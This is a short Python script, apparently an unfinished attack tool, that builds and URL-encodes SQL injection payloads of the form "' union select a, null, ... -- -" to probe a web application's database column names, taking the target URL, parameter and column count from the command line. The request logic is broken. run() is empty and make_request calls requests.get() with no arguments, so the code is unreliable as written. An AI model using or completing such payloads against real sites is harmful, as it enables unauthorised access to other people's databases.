import urllib
import requests
import argparse

class ColumnsNames:
    __url: str | None = None
    __param: str | None = None
    __cols_amount: int | None = None
    __col_name: str | None = None
    __payload: str | None = None
    
    def __init__(self, url, param, cols):
        self.__url = url
        self.__param = param
        self.__cols_amount = cols
        self.__col_name = 'a'
        self.configure_payload()
        print(f"{self.__payload}\n{self.encode_payload()}")
        self.run()

    def run(self):
        pass

    def configure_payload(self):
        self.__payload = f"' union select {self.__col_name}"
        for i in range(self.__cols_amount-1):
            self.__payload += ', null'

        self.__payload += '-- -'

    def encode_payload(self):
        return urllib.parse.quote(self.__payload)

    def make_request(self) -> int:
        requests.get()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Defining the name of columns")
    parser.add_argument("--url", "-u", type=str, nargs=1, help="Provide the url")
    parser.add_argument("--param", "-p", type=str, nargs=1, help="Provide the parameter")
    parser.add_argument("--cols", "-c", type=int, nargs=1, help="Amount of columns in DB")
    args = parser.parse_args()
    
    columnsNames = ColumnsNames(args.url[0], args.param[0], args.cols[0])
    columnsNames.run()